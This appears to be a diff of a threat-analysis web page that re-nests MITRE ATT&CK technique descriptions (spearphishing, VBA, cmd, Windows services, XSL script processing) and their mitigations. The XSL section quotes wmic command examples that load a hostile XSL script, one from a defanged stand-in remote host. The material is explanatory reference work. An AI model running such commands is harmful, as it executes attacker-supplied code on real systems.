-              <p>Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [<a href="https://attack.mitre.org/techniques/T1204">User Execution</a>] to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.
+              </div>
+            <button id="button2" class="collapsible">Phishing: Spearphishing Attachment</button>
+              <div class="content">
+                <p>Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [<a href="https://attack.mitre.org/techniques/T1204">User Execution</a>] to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.
 
 There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                  <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
-                  <p>Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</p>
-                  <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Phishing: Spearphishing Link</button>
-            <div class="content">
-              <p>Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                    <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
+                    <p>Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</p>
+                    <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Phishing: Spearphishing Link</button>
+              <div class="content">
+                <p>Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.
 
 All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [<a href="https://attack.mitre.org/techniques/T1204">User Execution</a>]. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [<a href="https://attack.mitre.org/techniques/T1528">Steal Application Access Token</a>]s, like OAuth tokens, in order to gain access to protected applications and information.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
-                  <p>Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</p>
-                  <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Obtain Capabilities: Tool</button>
-            <div class="content">
-              <p>Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [<a href="https://attack.mitre.org/software/S0029">PsExec</a>]). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [<a href="https://attack.mitre.org/software/S0154">Cobalt Strike</a>]. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
+                    <p>Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</p>
+                    <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Obtain Capabilities: Tool</button>
+              <div class="content">
+                <p>Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [<a href="https://attack.mitre.org/software/S0029">PsExec</a>]). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [<a href="https://attack.mitre.org/software/S0154">Cobalt Strike</a>]. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.
 
 Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Command and Scripting Interpreter: Visual Basic</button>
-            <div class="content">
-              <p>Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [<a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a>] and the [<a href="https://attack.mitre.org/techniques/T1106">Native API</a>] through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Command and Scripting Interpreter: Visual Basic</button>
+              <div class="content">
+                <p>Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [<a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a>] and the [<a href="https://attack.mitre.org/techniques/T1106">Native API</a>] through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.
 
 Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [<a href="https://attack.mitre.org/techniques/T1059/007">JavaScript</a>] on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).
 
 Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [<a href="https://attack.mitre.org/techniques/T1566/001">Spearphishing Attachment</a>] payloads.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
-                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                  <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Application Layer Protocol: Web Protocols</button>
-            <div class="content">
-              <p>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
+                    <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                    <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Application Layer Protocol: Web Protocols</button>
+              <div class="content">
+                <p>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
 
 Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Command and Scripting Interpreter: Windows Command Shell</button>
-            <div class="content">
-              <p>Adversaries may abuse the Windows command shell for execution. The Windows command shell ([<a href="https://attack.mitre.org/software/S0106">cmd</a>]) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [<a href="https://attack.mitre.org/techniques/T1021">Remote Services</a>] such as [<a href="https://attack.mitre.org/techniques/T1021/004">SSH</a>].
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Command and Scripting Interpreter: Windows Command Shell</button>
+              <div class="content">
+                <p>Adversaries may abuse the Windows command shell for execution. The Windows command shell ([<a href="https://attack.mitre.org/software/S0106">cmd</a>]) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [<a href="https://attack.mitre.org/techniques/T1021">Remote Services</a>] such as [<a href="https://attack.mitre.org/techniques/T1021/004">SSH</a>].
 
 Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.
 
 Adversaries may leverage [<a href="https://attack.mitre.org/software/S0106">cmd</a>] to execute various commands and payloads. Common uses include [<a href="https://attack.mitre.org/software/S0106">cmd</a>] to execute a single command, or abusing [<a href="https://attack.mitre.org/software/S0106">cmd</a>] interactively with input and output forwarded over a command and control channel.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Create or Modify System Process: Windows Service</button>
-            <div class="content">
-              <p>Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [<a href="https://attack.mitre.org/software/S0075">Reg</a>]. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Create or Modify System Process: Windows Service</button>
+              <div class="content">
+                <p>Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [<a href="https://attack.mitre.org/software/S0075">Reg</a>]. 
 
 Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.
 
 An adversary may also incorporate [<a href="https://attack.mitre.org/techniques/T1036">Masquerading</a>] by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. 
 
 Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [<a href="https://attack.mitre.org/techniques/T1569/002">Service Execution</a>]. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
-                  <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">XSL Script Processing</button>
-            <div class="content">
-              <p>Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
+                    <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">XSL Script Processing</button>
+              <div class="content">
+                <p>Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. 
 
 Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [<a href="https://attack.mitre.org/techniques/T1127">Trusted Developer Utilities Proxy Execution</a>], the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.
 
@@ -551,14 +555,15 @@ Command-line examples:
 
 * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
 * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code></p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                </div>
-            </div>
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                  </div>
+              </div>
           </div>
+        </div>
       </div>
-      <div id="footer">
+      <div class="footer">
         <ul>
           <li><a href="https://github.com/redbeardmeric/APTAnalyzer"><img src="./images/Github.png"></a></li>
           <li><a href="https://attack.mitre.org/"><img src="./images/Attck.png"></a></li>
